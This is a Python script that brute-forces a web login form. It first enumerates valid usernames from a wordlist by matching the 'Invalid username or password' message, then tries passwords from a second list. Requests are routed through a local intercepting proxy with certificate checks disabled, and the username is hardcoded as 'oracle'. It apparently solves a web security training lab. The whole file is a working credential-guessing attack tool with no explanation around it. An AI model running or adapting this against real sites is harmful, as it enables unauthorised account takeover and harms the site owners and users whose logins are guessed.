import os
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def findUserName(url):
    print("Enumerating The username: ")
    with open("usernames.txt", "r") as file:
        for username in file:
           print('\r' + ' ' * 50, end='', flush=True)
           print(f'\rTrying {username.strip()}', end='', flush=True)
           data = {'username':username.strip(), 'password':'HHHHHHHHHHHH'}
           responce = requests.post(url,data=data,proxies=proxies,  verify=False).text
           if  responce.find('Invalid username or password.') == -1: 
               file.close()
               return username.strip()
    return ''

def findPassword(username,url):
    print("Enumerating The Password: ")
    with open("passwords.txt", "r") as file:
        for password in file:
           print('\r' + ' ' * 50, end='', flush=True)
           print(f'\rTrying {password.strip()}', end='', flush=True)
           data = {'username':username, 'password':password.strip()}
           responce = requests.post(url,data=data,proxies=proxies,  verify=False).text
           if  responce.find('Invalid username or password') == -1: 
               return password.strip()
    
    return ''

def main():
    os.system('clear')
    if len(sys.argv) != 2:
        print(f'[Usage]: python {sys.argv[0]} <url>')
        print(f'Example: python {sys.argv[0]} www.example.com')
        sys.exit(-1)
    url = sys.argv[1]
    username ='oracle' #findUserName(url)
    if username == '':
        print('\nCannot find username ... ')
        sys.exit(-1)
    print(f'\nUsername => {username}')

    password = findPassword(username, url)
    if password =='':
        print("\nCan't Find PAssword")
        sys.exit(-1)
    print(f"\nPassword =>  {password}")
if __name__ == "__main__":
    main()

